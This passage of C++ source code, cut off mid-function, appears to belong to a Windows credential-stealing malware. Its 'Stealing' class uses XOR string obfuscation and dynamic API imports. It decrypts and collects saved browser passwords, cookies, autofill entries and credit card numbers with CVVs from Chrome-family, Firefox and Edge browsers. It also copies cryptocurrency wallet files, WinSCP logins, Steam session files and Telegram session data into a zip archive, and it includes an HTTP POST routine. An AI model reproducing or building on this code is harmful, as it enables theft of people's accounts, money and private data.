		if (domain.find(XOR("https")) != string::npos) // важно, что https проверяется первым, т.к под строка http встречается в https
			idx = XorInt(8);
		else if (domain.find(XOR("http")) != string::npos)
			idx = XorInt(7);
		if (idx != 0)
			result = domain.substr(idx);
		result = result.substr(0, result.find('/'));
		if (result.find(XOR("www.")) != string::npos)
			result = result.substr(XorInt(4));
		return result;
	}
	catch (...) { return ""; }
}

string Stealing::stripToDirectory(const string & path)
{
	try
	{
		return path.find('\\') == string::npos ? "" : (path.substr(path.rfind('\\') + 1));
	}
	catch (...) { return ""; }
}

int Stealing::HexStringToInt(const string & str) const
{
	try
	{
		if (str.size() == 2)
		{
			int result = 0;
			
			if (str[1] >= 'a' && str[1] <= 'f')
				result += (10 + str[1] - 'a');
			else if (str[1] >= 'A' && str[1] <= 'F')
				result += (10 + str[1] - 'A');
			else
				result += (str[1] - '0');

			if (str[0] >= 'a' && str[0] <= 'f')
				result += 16 * (10 + str[0] - 'a');
			else if (str[0] >= 'A' && str[0] <= 'F')
				result += 16 * (10 + str[0] - 'A');
			else
				result += 16 * (str[0] - '0');

			return result;
		}
	}
	catch (...) { return 0; }
}

void Stealing::RC4(string & buff, const string & key) const
{
	try
	{
		int s[256];
		int i = 0, j = 0, x;

		for (i = 0; i < 256; ++i)
			s[i] = i;
		for (i = 0; i < 256; ++i)
		{
			j = (j + s[i] + key[i % key.size()]) % 256;
			x = s[i];
			s[i] = s[j];
			s[j] = x;
		}

		j = 0;
		i = 0;

		for (int k = 0; k < buff.size(); ++k)
		{
			i = (i + 1) % 256;
			j = (j + s[i]) % 256;
			x = s[i];
			s[i] = s[j];
			s[j] = x;

			// int c = (s[(i <<= 5) ^ (j >>= 3)] + s[(j <<= 5) ^ (i >>= 3)]) % 256;
			// int k = ((s[(s[i] + s[j]) % 256] + s[c ^ 0xAA]) % 256) ^ s[(j + s[j]) % 256];
			// buff[k] ^= k;
			buff[k] ^= s[(s[i] + s[j]) % 256];
		}
	}
	catch (...) { return; }
}

string Stealing::SHA1(const string & buff) const
{
	try
	{
		char* chars = XOR("0123456789ABCDEF");

		vector<byte> buffer;
		for (size_t j = 0; j < buff.size(); ++j)
			buffer.push_back(buff[j]);

		uint8_t key[SHA_DIGEST_LENGTH];
		SHA1_CTX ctx;
		SHA1_Init(&ctx);
		SHA1_Update(&ctx, buffer.data(), buffer.size());
		SHA1_Final(key, &ctx);

		string dir(40, 0);
		char* buf = (char*)dir.data();
		for (int j = 0; j < 20; ++j)
		{
			*buf++ = chars[key[j] >> 4];
			*buf++ = chars[key[j] & 0x0F];
		}

		return dir;
	}
	catch (...) { return string(); }
}

string Stealing::FoxmailDecode(bool v, const string & pHash)
{
	try
	{
		string decodedPassword = string();

		if (!pHash.empty())
		{
			byte hash[] = { '~', 'd', 'r', 'a', 'G', 'o', 'n', '~' };
			int hashSize = 8;
			int fc0 = 0x5A;

			if (v)
			{
				hash[0] = '~';
				hash[1] = 'F';
				hash[2] = '@';
				hash[3] = '7';
				hash[4] = '%';
				hash[5] = 'm';
				hash[6] = '$';
				hash[7] = '~';

				fc0 = 0x71;
			}

			int size = pHash.size() / 2, index = 0;
			vector<byte> ciphered, salt;
			for (int i = 0; i < size; ++i)
			{
				ciphered.push_back((byte)HexStringToInt(pHash.substr(index, 2)));
				index += 2;
			}

			salt.push_back(ciphered[0] ^ fc0);
			for (int i = 1; i < size; ++i)
				salt.push_back(ciphered[i]);

			vector<byte> seq;
			while (ciphered.size() > hashSize)
			{
				for (int i = 0; i < 8; ++i)
					seq.push_back((byte)hash[i]);
				hashSize <<= 1;
			}

			vector<byte> resSeq = vector<byte>(size);
			for (int i = 1; i < size; ++i)
				resSeq[i - 1] = ciphered[i] ^ seq[i - 1];

			for (int i = 0; i < size - 1; ++i)
			{
				if (resSeq[i] - salt[i] < 0)
					decodedPassword += resSeq[i] + 255 - salt[i];
				else
					decodedPassword += resSeq[i] - salt[i];
			}
		}

		return decodedPassword;
	}
	catch (...) { return string(); }
}

unsigned long long Stealing::str2ull(const string & str)
{
	try
	{
		if (str.empty() || !isNumeric(str))
			return 0;
		unsigned long long res = 0;
		res += str[0] - '0';
		for (size_t i = 1; i < str.size(); ++i)
		{
			res *= XorInt(10);
			res += str[i] - '0';
		}
		return res;
	}
	catch (...) { return 0; }
}

unsigned long long Stealing::ToUnixTimeStamp(unsigned long long chromeTimeStamp)
{
	try
	{
		return ((unsigned long long)(chromeTimeStamp / 1000000ULL)) - 11644473600ULL;
	}
	catch (...) { return 1830365600ULL; }
}

void Stealing::NetscapeCookie(const string & cookie_path, string & output)
{
	try
	{
		string text;
		ReadAllText(cookie_path, text);

		if (text != "")
		{
			vector<string> vecCookies;
			if (splitBy(text, '*', vecCookies))
			{
				for (string & cookie : vecCookies)
				{
					vector<string> data;
					if (splitBy(cookie, '\n', data))
					{
						if (data.size() > 2)
						{
							vector<string> domain;
							if (splitBy(data[2], '/', domain))
								output += domain[0] + XOR("\tTRUE\t") + (domain.size() == 1 ? "/" : "/" + domain[1])
								+ XOR("\tFALSE\t1830365600\t") + data[0] + '\t' + data[1] + "\r\n";
						}
					}
				}
			}
			cookies += vecCookies.size() - 1;
		}
	}
	catch (...) { return; }
}

void Stealing::ProcessCookies(const string & path, string & output)
{
	try
	{
		WIN32_FIND_DATA data;
		HANDLE hFile = findFirstFileA((path + XOR("\\#!*")).c_str(), &data);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			do
			{
				if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					const string base_path = path + '\\' + (string)data.cFileName + XOR("\\MicrosoftEdge\\Cookies");
					WIN32_FIND_DATA pData;
					HANDLE hCookies = findFirstFileA((base_path + XOR("\\*.cookie")).c_str(), &pData);
					if (hCookies != INVALID_HANDLE_VALUE)
					{
						do
						{
							NetscapeCookie(base_path + '\\' + pData.cFileName, output);
						} while (findNextFileA(hCookies, &pData));
						findClose(hCookies);
					}
				}
			} while (findNextFileA(hFile, &data));
			findClose(hFile);
		}
	}
	catch (...) { return; }
}

string Stealing::GetRequest(const string & site, const string & url)
{
	try
	{
		DWORD timeOut = XorInt(300000);
		internetSetOptionA(NULL, XorInt(INTERNET_OPTION_SEND_TIMEOUT), &timeOut, sizeof(timeOut));
		HINTERNET hInternet = internetOpenA(user_agent.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		string res = "";
		if (hInternet != NULL)
		{
			HINTERNET hConnect = internetConnectA
				(hInternet, site.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
			if (hConnect != NULL)
			{
				HINTERNET hRequest = NULL;
				DWORD flag = INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE;
				if (port == INTERNET_DEFAULT_HTTPS_PORT)
					flag |= INTERNET_FLAG_SECURE;
				hRequest = httpOpenRequestA(hConnect, XOR("POST"), url.c_str(), NULL, NULL, 0, flag, 1);

				if (hRequest != NULL)
				{
					string sHeaders = (string)XOR("Content-Type: text/html\r\nUser-Agent: ") + user_agent
						+ XOR("\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
					char szRequest[4096] = { 0 };

					BOOL bSend = httpSendRequestA(hRequest, sHeaders.c_str(), sHeaders.size(), szRequest, strlen(szRequest));
					if (bSend)
					{
						char szBuffer[4096] = { 0 };
						DWORD dwRead = 0;
						while (FNC(InternetReadFile, XOR("Wininet.dll"))
							(hRequest, szBuffer, sizeof(szBuffer) - 1, &dwRead) & dwRead);
						res = (string)szBuffer;
					}
					internetCloseHandle(hRequest);
				}
				internetCloseHandle(hConnect);
			}
			internetCloseHandle(hInternet);
		}

		return res;
	}
	catch (...) { return ""; }
}

constexpr unsigned int Stealing::getDate()
{
	constexpr auto date = __DATE__;

	unsigned int res = 0;
	if (date[4] != ' ')
		res = (date[4] - '0') * 10 + (date[5] - '0');
	else
		res = date[5] - '0';
	res += (date[7] - '0') * 1000 + (date[8] - '0') * 100 + (date[9] - '0') * 10 + (date[10] - '0');

	return res;
}

Loader * Stealing::GetLoaderInstance()
{
	if (pLdr == nullptr)
		pLdr = new Loader;
	return pLdr;
}

const string Stealing::define_browser(const string & path, bool user)
{
	try
	{
		vector<string> vec;
		if (splitBy(path, '\\', vec))
		{
			if (vec.size() >= 6)
			{
				if (path.find(XOR("Opera")) != string::npos)
				{
					if (user)
						return XOR("Opera (user: ") + vec[2] + ')';
					return XOR("Opera");
				}
				else if (path.find(XOR("Thunderbird")) != string::npos)
				{
					if (user)
						return XOR("Thunderbird (user: ") + vec[2] + ')';
					return XOR("Thunderbird");
				}
				else if (path.find(XOR("formhistory.sqlite")) != string::npos ||
						path.find(XOR("cookies.sqlite")) != string::npos ||
						path.find(XOR("logins.json")) != string::npos ||
						path.find(XOR("signons.sqlite")) != string::npos ||
						path.find(XOR("places.sqlite")) != string::npos)
				{
					if (user)
						return vec[5] + XOR(" (user: ") + vec[2] + ')';
					return vec[5];
				}
				else
				{
					if (user)
						return vec[6] + XOR(" (user: ") + vec[2] + ')';
					return vec[6];
				}
			}

			return XOR("Unknown browser");
		}

		return "";
	}
	catch (...) { return ""; }
}

void Stealing::InitApi()
{
	try
	{
		IMPORT(cryptUnprotectData, CryptUnprotectData, XOR("Crypt32.dll"));
		
		char* kernel = XOR("Kernel32.dll");
		IMPORT(findClose, FindClose, kernel);
		IMPORT(findFirstFileA, FindFirstFileA, kernel);
		IMPORT(findNextFileA, FindNextFileA, kernel);

		char* wininet = XOR("wininet.dll");
		IMPORT(internetSetOptionA, InternetSetOptionA, wininet);		
		IMPORT(internetOpenA, InternetOpenA, wininet);
		IMPORT(internetConnectA, InternetConnectA, wininet);
		IMPORT(httpOpenRequestA, HttpOpenRequestA, wininet);
		IMPORT(httpSendRequestA, HttpSendRequestA, wininet);
		IMPORT(internetCloseHandle, InternetCloseHandle, wininet);

		char* advapi = XOR("Advapi32.dll");
		IMPORT(regOpenKeyA, RegOpenKeyA, advapi);
		IMPORT(regCloseKey, RegCloseKey, advapi);
		IMPORT(regEnumKeyA, RegEnumKeyA, advapi);
	}
	catch (...) { return; }
}

void Stealing::GetPasswords(const string & path)
{
	try
	{
		if (File.Exists(new_path))
			File.Delete(new_path);

		bool b;
		SqlHandler* sql = new SqlHandler(path, b, new_path);
		if (b && sql->ReadTable(XOR("logins")))
		{
			string temp_res = "";
			const string browser = define_browser(path);
			const int old_value = passwords;
			const int rowCount = sql->GetRowCount();
			
			for (int i = 0; i < rowCount; ++i)
			{
				try
				{
					const string pass = DecryptStr(sql->GetValue(i, 5));
					if (pass != "")
					{
						const string url = sql->GetValue(i, 0);
						temp_res += XOR("Url: ") + url + "\r\n";
						
						// LOADER
						string domain = extractDomain(url);
						if (!domain.empty())
							hashes.push_back(crc32_hash(domain));
						// LOADER

						temp_res += XOR("Login: ") + sql->GetValue(i, 3) + "\r\n";
						temp_res += XOR("Password: ") + pass + "\r\n";
						temp_res += XOR("Browser: ") + browser + "\r\n\r\n";
						++passwords;
					}
				}
				catch (...) { continue; }
			}

			if (temp_res != "")
				pass.output += temp_res;

			log.output += path + XOR(" : Count = ") + std::to_string(passwords - old_value) + "\r\n";
		}

		delete sql;
	}
	catch (...) { return; }
}

void Stealing::GetCookies(const string & path)
{
	try
	{
		if (File.Exists(new_path))
			File.Delete(new_path);
		
		bool b;
		SqlHandler* sql = new SqlHandler(path, b, new_path);
		if (b && sql->ReadTable(XOR("cookies")))
		{
			string temp_res = "";
			const string browser = define_browser(path);
			const int old_cookies = cookies;
			const int rowCount = sql->GetRowCount();

			for (int i = 0; i < rowCount; ++i)
			{
				string temp = "";
				const string cookie_key = DecryptStr(sql->GetValue(i, 12));
				if (cookie_key != "")
				{
					const string host_key = sql->GetValue(i, 1);
					temp += host_key /* host key */ + XOR("\tTRUE\t");
					temp += sql->GetValue(i, 4) /* path */;
					const string timestamp =
						sql->GetValue(i, 5) == "0" ? XOR("1830365600") : std::to_string(ToUnixTimeStamp(str2ull(sql->GetValue(i, 5))));
					temp += XOR("\tFALSE\t") + timestamp + '\t' /* expires_uts*/
						+ sql->GetValue(i, 2) /* name */
						+ '\t' + cookie_key + "\r\n";
					++cookies;

					// if (!contains_record(cookieList, host_key))
					cookieList.push_back(host_key);
					temp_res += temp;
				}
			}

			if (temp_res != "")
			{
				zip.addFileMemory(cookiePath + '\\' + define_browser(path, false) +
					'_' + std::to_string(cookieIndex) + XOR(".txt"), temp_res);
				++cookieIndex;
			}

			log.output += path + XOR(" : Count = ") + std::to_string(cookies - old_cookies) + "\r\n";
		}
		delete sql;
	}
	catch (...) { return; }
}

void Stealing::GetForms(const string & path)
{
	try
	{
		if (File.Exists(new_path))
			File.Delete(new_path);
		
		bool b;
		SqlHandler* sql = new SqlHandler(path, b, new_path);
		if (b && sql->ReadTable(XOR("autofill")))
		{
			string temp_res = "";
			const string browser = define_browser(path);
			const int old_value = forms;
			const int rowCount = sql->GetRowCount();

			for (int i = 0; i < rowCount; ++i)
			{
				const string form_value = (sql->GetValue(i, 1).empty() ? sql->GetValue(i, 2) : sql->GetValue(i, 1));
				if (!form_value.empty())
				{
					temp_res += XOR("Form name: ") + sql->GetValue(i, 0) + "\r\n";
					temp_res += XOR("Form value: ") + form_value + "\r\n";
					temp_res += XOR("Browser: ") + browser + "\r\n\r\n";
					++forms;
				}
			}

			if (temp_res != "")
				form.output += temp_res;

			log.output += path + XOR(" : Count = ") + std::to_string(forms - old_value) + "\r\n";
		}
		delete sql;
	}
	catch (...) { return; }
}

void Stealing::GetCards(const string & path)
{
	try
	{
		if (File.Exists(new_path))
			File.Delete(new_path);
		
		bool b;
		SqlHandler* sql = new SqlHandler(path, b, new_path);
		string temp_res = "";
		const string browser = define_browser(path);

		if (b && sql->ReadTable(XOR("credit_cards")))
		{
			const int old_value = cards;
			const int rowCount = sql->GetRowCount();

			for (int i = 0; i < rowCount; ++i)
			{
				const string card_num = DecryptStr(sql->GetValue(i, 4));
				if (card_num != "")
				{
					temp_res += XOR("Name: ") + sql->GetValue(i, 1) + "\r\n";
					temp_res += XOR("Month\\Year: ") + sql->GetValue(i, 2) + '\\' + sql->GetValue(i, 3) + "\r\n";
					temp_res += XOR("Card number: ") + card_num + "\r\n";
					temp_res += XOR("CVV: ") + sql->GetValue(i, 9) + "\r\n";
					temp_res += XOR("Url: ") + sql->GetValue(i, 6) + "\r\n";
					temp_res += XOR("Browser: ") + browser + "\r\n\r\n";
					++cards;
				}
			}

			if (!temp_res.empty())
				card.output += temp_res;
			
			log.output += path + XOR(" : Count = ") + std::to_string(cards - old_value) + "\r\n";
		}

		if (sql->ReadTable(XOR("masked_credit_cards")))
		{
			temp_res = "";
			const int old_value = cards;
			const int rowCount = sql->GetRowCount();
			
			for (int i = 0; i < rowCount; ++i)
			{
				if (!sql->GetValue(i, 4).empty())
				{
					temp_res += XOR("Name: ") + sql->GetValue(i, 2) + "\r\n";
					temp_res += XOR("Last four: ") + sql->GetValue(i, 4) + "\r\n";
					temp_res += XOR("Month\\Year: ") + sql->GetValue(i, 5) + '\\' + sql->GetValue(i, 6) + "\r\n";
					temp_res += XOR("Bank: ") + sql->GetValue(i, 7) + ' ' + sql->GetValue(i, 3) + "\r\n\r\n";
					++cards;
				}
			}

			if (!temp_res.empty())
				card.output += temp_res;
			log.output += path + XOR(" : Count = ") + std::to_string(cards - old_value) + "\r\n";
		}

		if (sql->ReadTable(XOR("unmasked_credit_cards")))
		{
			temp_res = "";
			const int old_value = cards;
			const int rowCount = sql->GetRowCount();
			
			for (int i = 0; i < rowCount; ++i)
			{
				const string card_num = DecryptStr(sql->GetValue(i, 1));
				if (!card_num.empty())
				{
					temp_res += XOR("Card number: ") + card_num + "\r\n\r\n";
					++cards;
				}
			}

			if (!temp_res.empty())
				card.output += temp_res;

			log.output += path + XOR(" : Count = ") + std::to_string(cards - old_value) + "\r\n";
		}

		delete sql;
	}
	catch (...) { return; }
}

void Stealing::GetHistory(const string & path)
{
	try
	{
		if (File.Exists(new_path))
			File.Delete(new_path);

		bool b;
		SqlHandler* sql = new SqlHandler(path, b, new_path);
		if (b && sql->ReadTable(XOR("urls")))
		{
			string temp_res = "";
			const string outputPath = historyDir + '\\' + define_browser(path, false) + '_' + std::to_string(historyIndex) + XOR(".txt");
			const int rowCount = sql->GetRowCount();

			for (int i = 0; i < rowCount; ++i)
			{
				const string value = sql->GetValue(i, 1);
				if (value != "")
					temp_res += XOR("Title: ") + sql->GetValue(i, 2) + XOR("\r\nUrl: ") + value + "\r\n\r\n";
			}

			if (temp_res != "")
				zip.addFileMemory(outputPath, temp_res);
			++historyIndex;
		}
		delete sql;
	}
	catch (...) { return; }
}

void Stealing::GetFormsGecko(const string & path)
{
	try
	{
		if (File.Exists(new_path))
			File.Delete(new_path);

		bool b;
		SqlHandler* sql = new SqlHandler(path, b, new_path);
		if (b && sql->ReadTable(XOR("moz_formhistory")))
		{
			string temp_res = "";
			const string browser = define_browser(path);
			const int old_value = forms;
			const int rowCount = sql->GetRowCount();

			for (int i = 0; i < rowCount; ++i)
			{
				const string form_value = sql->GetValue(i, 2);
				if (form_value != "" && form_value.size() < 90)
				{
					temp_res += XOR("Form name: ") + sql->GetValue(i, 1) + "\r\n";
					temp_res += XOR("Form value: ") + form_value + "\r\n";
					temp_res += XOR("Browser: ") + browser + "\r\n\r\n";
					++forms;
				}
			}

			if (temp_res != "")
			{
				form.output += temp_res;
				log.output += path + XOR(" : Count = ") + std::to_string(forms - old_value) + "\r\n";
			}
		}
		delete sql;
	}
	catch (...) { return; }
}

void Stealing::GetCookiesGecko(const string & path)
{
	try
	{
		if (File.Exists(new_path))
			File.Delete(new_path);

		bool b;
		SqlHandler* sql = new SqlHandler(path, b, new_path);
		if (b && sql->ReadTable(XOR("moz_cookies")))
		{
			string temp_res = "";
			const int old_value = cookies;
			const int rowCount = sql->GetRowCount();

			for (int i = 0; i < rowCount; ++i)
			{
				string temp = "";
				const string cookie_key = sql->GetValue(i, 4);
				if (!cookie_key.empty())
				{
					// $domain TRUE $path FALSE $expiry $name $key
					const string host_key = sql->GetValue(i, 5);
					temp += host_key /* host key */ + XOR("\tTRUE\t");
					temp += sql->GetValue(i, 6) /* path */ + '\t';

					temp += XOR("FALSE\t") + sql->GetValue(i, 7) + '\t' /* secure always FALSE | expiry */
						+ sql->GetValue(i, 3) /* name */
						+ '\t' + cookie_key + "\r\n";
					
					cookieList.push_back(host_key);
					temp_res += temp;
					++cookies;
				}
			}

			if (temp_res != "")
			{
				string th = cookiePath + '\\' + define_browser(path, false) +
					'_' + std::to_string(cookieIndex) + XOR(".txt");
				zip.addFileMemory(th, temp_res);
				++cookieIndex;
				log.output += path + XOR(" : Count = ") + std::to_string(cookies - old_value) + "\r\n";
			}
		}
		delete sql;
	}
	catch (...) { return; }
}

void Stealing::GetPasswordsGecko(const string & path)
{
	try
	{
		string profilePath = path;
		for (size_t i = profilePath.size() - 1; i >= 0; --i)
		{
			if (profilePath[i] == '\\')
			{
				profilePath = profilePath.substr(0, i);
				break;
			}
		}
		
		FireFoxGrabber* pFireFoxGrabber = new FireFoxGrabber;
		if (File.Exists(profilePath + XOR("\\key4.db")))
			pFireFoxGrabber->ProcessKey(profilePath + XOR("\\key4.db"), false);
		if (File.Exists(profilePath + XOR("\\key3.db")))		
			pFireFoxGrabber->ProcessKey(profilePath + XOR("\\key3.db"), true);

		if (!pFireFoxGrabber->IsSuccess())
			return;

		if (path.find(XOR(".json")) != string::npos)
		{
			string loginStrings = "";
			if (File.Exists(new_path))
				File.Delete(new_path);
			File.Copy(path, new_path);
			ReadAllText(new_path, loginStrings);
			
			if (!loginStrings.empty())
			{
				const string browser = define_browser(path);
				const int old_passwords = passwords;
				
				size_t index = loginStrings.find(XOR("\"hostname\""));
				while (index != string::npos)
				{
					loginStrings = loginStrings.substr(index + sizeof("\"hostname\"") + 1);
					const string url = loginStrings.substr(0, loginStrings.find('\"'));
						
					index = loginStrings.find(XOR("\"encryptedUsername\""));
					loginStrings = loginStrings.substr(index + sizeof("\"encryptedUsername\"") + 1);
					const string username = pFireFoxGrabber->DecryptStr(loginStrings.substr(0, loginStrings.find('\"')));

					index = loginStrings.find(XOR("\"encryptedPassword\""));
					loginStrings = loginStrings.substr(index + sizeof("\"encryptedPassword\"") + 1);
					const string password = pFireFoxGrabber->DecryptStr(loginStrings.substr(0, loginStrings.find('\"')));
					
					if (!password.empty())
					{
						pass.output += XOR("Url: ") + url + "\r\n";

						// LOADER
						string domain = extractDomain(url);
						if (!domain.empty())
							hashes.push_back(crc32_hash(domain));
						// LOADER

						pass.output += XOR("Login: ") + username + "\r\n";
						pass.output += XOR("Password: ") + password + "\r\n";
						pass.output += XOR("Browser: ") + browser + "\r\n\r\n";
						++passwords;
					}
						
					loginStrings = loginStrings.substr(index + sizeof("\"encryptedPassword\"") + 1);
					index = loginStrings.find(XOR("\"hostname\""));
				}

				log.output += path + XOR(" : Count = ") + std::to_string(passwords - old_passwords) + "\r\n";
			}
		}
		else if (path.find(XOR(".sqlite")) != string::npos)
		{
			bool b;
			SqlHandler* sql = new SqlHandler(path, b);
			if (b && sql->ReadTable(XOR("moz_logins")))
			{
				const int old_passwords = passwords;
				const int rowCount = sql->GetRowCount();

				const string browser = define_browser(path);
				for (int i = 0; i < rowCount; ++i)
				{
					const string password = pFireFoxGrabber->DecryptStr(sql->GetValue(i, 7));
					if (password != "")
					{
						const string url = sql->GetValue(i, 3);
						pass.output += XOR("Url: ") + url + "\r\n";

						// LOADER
						string domain = extractDomain(url);
						if (!domain.empty())
							hashes.push_back(crc32_hash(domain));
						// LOADER

						pass.output += XOR("Login: ") + pFireFoxGrabber->DecryptStr(sql->GetValue(i, 6)) + "\r\n";
						pass.output += XOR("Password: ") + password + "\r\n";
						pass.output += XOR("Browser: ") + browser + "\r\n\r\n";
						++passwords;
					}
				}

				log.output += path + XOR(" : Count = ") + std::to_string(passwords - old_passwords) + "\r\n";
			}
			delete sql;
		}

		delete pFireFoxGrabber;
	}
	catch (...) { return; }
}

void Stealing::GetHistoryGecko(const string & path)
{
	try
	{
		if (File.Exists(new_path))
			File.Delete(new_path);
		bool b;
		SqlHandler* sql = new SqlHandler(path, b, new_path);
		if (b && sql->ReadTable(XOR("moz_places")))
		{
			string temp_res = "";
			const string outputPath = historyDir + '\\' + define_browser(path, false) + '_' + std::to_string(historyIndex) + XOR(".txt");
			const int rowCount = sql->GetRowCount();

			for (int i = 0; i < rowCount; ++i)
			{
				const string value = sql->GetValue(i, 1);
				if (value != "")
					temp_res += XOR("Title: ") + sql->GetValue(i, 2) + XOR("\r\nUrl: ") + value + "\r\n\r\n";
			}

			++historyIndex;
			if (temp_res != "")
				zip.addFileMemory(outputPath, temp_res);
		}
		delete sql;
	}
	catch (...) { return; }
}

void Stealing::GetEdgePasswords()
{
	try
	{
		EdgeGrabber* edge = new EdgeGrabber();
		if (edge->Init())
		{
			vector<Password> passes;
			edge->FillPasswords(passes);
			if (passes.size() > 0)
			{
				for (Password & temp : passes)
				{
					pass.output += XOR("Url: ") + temp.url + "\r\n";
					
					// LOADER
					string domain = extractDomain(temp.url);
					if (!domain.empty())
						hashes.push_back(crc32_hash(domain));
					// LOADER

					pass.output += XOR("Login: ") + temp.login + "\r\n";
					pass.output += XOR("Password: ") + temp.password + "\r\n";
					pass.output += XOR("Browser: Edge\r\n\r\n");
				}
				passwords += passes.size();
			}
		}
		delete edge;
	}
	catch (...) { return; }
}

void Stealing::GetEdgeCookies()
{
	try
	{
		WIN32_FIND_DATA edgeData;
		const string init_path = (string)getenv(XOR("localappdata")) + XOR("\\Packages\\Microsoft.MicrosoftEdge_*");
		HANDLE hEdge = findFirstFileA(init_path.c_str(), &edgeData);
		if (hEdge != INVALID_HANDLE_VALUE)
		{
			const string base_path = (string)getenv(XOR("localappdata")) + XOR("\\Packages\\") + (string)edgeData.cFileName + XOR("\\AC");
			string cookie_result = "";
			ProcessCookies(base_path, cookie_result);
			zip.addFileMemory(cookiePath + XOR("\\Edge_") + std::to_string(cookieIndex) + XOR(".txt"), cookie_result);
			++cookieIndex;
			findClose(hEdge);
		}
	}
	catch (...) { return; }
}

void Stealing::GetWallets(const string & output_dir)
{
	try
	{
		const string appdata_path = (string)getenv(XorStr("AppData"));
		const string query = XOR("*.wallet");
		
		auto* folder = File.dirInstance();
		
		zip.addFolder(output_dir);
		if (folder->Exists(appdata_path + XOR("\\Electrum\\wallets")))
			COPY_WALLET(XOR("Electrum"), appdata_path + XOR("\\Electrum\\wallets"), "*");
		if (folder->Exists(appdata_path + XOR("\\MultiBit")))
			COPY_WALLET(XOR("MultiBit"), appdata_path + XOR("\\MultiBit"), query);
		if (folder->Exists(appdata_path + XOR("\\Armory")))
			COPY_WALLET(XOR("Armory"), appdata_path + XOR("\\Armory"), query);
		if (folder->Exists(appdata_path + XOR("\\Ethereum\\keystore")))
			COPY_WALLET(XOR("Ethereum"), appdata_path + XOR("\\Ethereum\\keystore"), "*");
		if (folder->Exists(appdata_path + XOR("\\bytecoin")))
			COPY_WALLET(XOR("Bytecoin"), appdata_path + XOR("\\bytecoin"), query);
		if (folder->Exists(appdata_path + XOR("\\Jaxx\\Local Storage")))
			COPY_WALLET(XOR("Jaxx"), appdata_path + XOR("\\Jaxx\\Local Storage"), "*");
		if (folder->Exists(appdata_path + XOR("\\atomic")))
			COPY_WALLET(XOR("atomic"), appdata_path + XOR("\\atomic"), "*");
		if (folder->Exists(appdata_path + XOR("\\Exodus")))
			COPY_WALLET(XOR("Exodus"), appdata_path + XOR("\\Exodus\\exodus.wallet"), "*");
	}
	catch (...) { return; }
}

void Stealing::GetFiles(const string & output_dir)
{
	try
	{
		if (grabber.rules.empty())
			return;
		zip.addFolder(output_dir);

		for (Rule & rule : grabber.rules)
		{
			for (size_t i = 0; i < rule.pathes.size(); ++i)
			{
				for (size_t j = 0; j < rule.extensions.size(); ++j)
				{
					if (rule.bRecursive)
						CopyByMaskRecursive(rule.pathes[i], rule.extensions[j], output_dir, rule.iMaxFileSize, rule.exceptions, true);
					else
						CopyByMask(rule.pathes[i], rule.extensions[j], output_dir, rule.iMaxFileSize, true, rule.exceptions, true);
				}
			}
		}
	}
	catch (...) { return; }
}

void Stealing::GetWinScp(const string & output_dir)
{
	try
	{
		const string winscp_path = XOR("Software\\Martin Prikryl\\WinSCP 2\\Sessions");
		string result = "";

		HKEY key;
		regOpenKeyA(HKEY_CURRENT_USER, winscp_path.c_str(), &key);
		if (key != nullptr)
		{
			char buff[1024];
			DWORD index = 0;

			LSTATUS stat = regEnumKeyA(key, index, buff, 1024);
			while (stat == ERROR_SUCCESS)
			{
				HKEY full_key;
				regOpenKeyA(HKEY_CURRENT_USER, (winscp_path + '\\' + (string)buff).c_str(), &full_key);

				if (full_key != nullptr)
				{
					string host, login, password;
					GetStringRegKeyA(full_key, XOR("HostName"), host, "");
					GetStringRegKeyA(full_key, XOR("UserName"), login, "");
					GetStringRegKeyA(full_key, XOR("Password"), password, "");

					if (!host.empty() && !login.empty() && !password.empty())
					{
						result += XOR("Host: ") + host + "\r\n";
						result += XOR("Username: ") + login + "\r\n";
						result += XOR("Password: ") + password + "\r\n\r\n";
					}
				}

				++index;
				regCloseKey(full_key);

				stat = regEnumKeyA(key, index, buff, 1024);
			}
			regCloseKey(key);

			if (!result.empty())
			{
				zip.addFolder(output_dir);
				zip.addFileMemory(output_dir + XOR("\\WinSCP.txt"), result);
			}
		}		
	}
	catch (...) { return; }
}

void Stealing::GetSteam(const string & output_dir)
{
	try
	{
		HKEY key;
		regOpenKeyA(HKEY_CURRENT_USER, XOR("Software\\Valve\\Steam"), &key);

		string SteamPath = "";
		GetStringRegKeyA(key, XOR("SteamPath"), SteamPath, "");
		regCloseKey(key);

		if (SteamPath == "")
			return;

		CopyByMask(SteamPath, XOR("ssfn*"), output_dir);

		WIN32_FIND_DATA data;
		HANDLE hConfig = findFirstFileA((SteamPath + XOR("\\config\\*.vdf")).c_str(), &data);

		if (hConfig == INVALID_HANDLE_VALUE)
		{
			findClose(hConfig);
			return;
		}
		else
		{
			zip.addFolder(output_dir);
			do
			{
				const string file_name = data.cFileName;
				if (file_name.size() <= XorInt(18))
				{
					zip.addFile(SteamPath + XOR("\\config\\") + file_name, output_dir + '\\' + file_name);
					if (file_name == XOR("loginusers.vdf"))
						SteamHelper(SteamPath, output_dir);
					bSteam = true;
				}
			} while (findNextFileA(hConfig, &data));
			findClose(hConfig);
		}
	}
	catch (...) { return; }
}

void Stealing::GetTelegram(const string & output_dir)
{
	try
	{
		string teleg_path = "";
		HKEY key;
		regOpenKeyA(HKEY_CURRENT_USER,
			XOR("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{53F49750-6209-4FBF-9CA8-7A333C87D1ED}_is1"), &key);
		GetStringRegKeyA(key, XOR("InstallLocation"), teleg_path, "");
		regCloseKey(key);

		if (teleg_path.empty())
		{
			HKEY hKey;
			regOpenKeyA(HKEY_CURRENT_USER, XOR("Software\\Classes\\tdesktop.tg\\DefaultIcon"), &hKey);
			GetStringRegKeyA(hKey, "", teleg_path, "");
			regCloseKey(hKey);
			if(teleg_path == "")
				teleg_path = (string)getenv(XorStr("AppData")) + XOR("\\Telegram Desktop\\tdata");
			else
				teleg_path = teleg_path.substr(1, teleg_path.find_last_of('\\')) + XOR("tdata");
		}
		else
			teleg_path += XOR("tdata");

		if (!File.dirInstance()->Exists(teleg_path))
			return;

		zip.addFolder(output_dir);
		bool group1 = CopyByMask(teleg_path, XOR("D877F783D5D3EF8C*"), output_dir);
		teleg_path += (string)XOR("\\D877F783D5D3EF8C");
